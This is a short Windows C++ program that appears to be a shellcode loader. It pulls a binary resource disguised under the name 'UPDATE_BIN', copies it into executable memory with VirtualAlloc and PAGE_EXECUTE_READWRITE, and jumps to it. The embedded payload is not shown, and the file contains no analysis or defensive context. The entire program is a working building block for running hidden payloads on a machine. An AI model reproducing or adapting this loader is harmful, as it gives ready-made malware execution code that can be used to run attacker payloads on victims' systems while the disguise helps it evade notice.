#include <iostream>
#include "resource.h"
#include <Windows.h>

int main()
{
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_UPDATE_BIN1), L"UPDATE_BIN");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);

	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResourceData, shellcodeSize);
	((void(*)())exec)();

	return 0;
}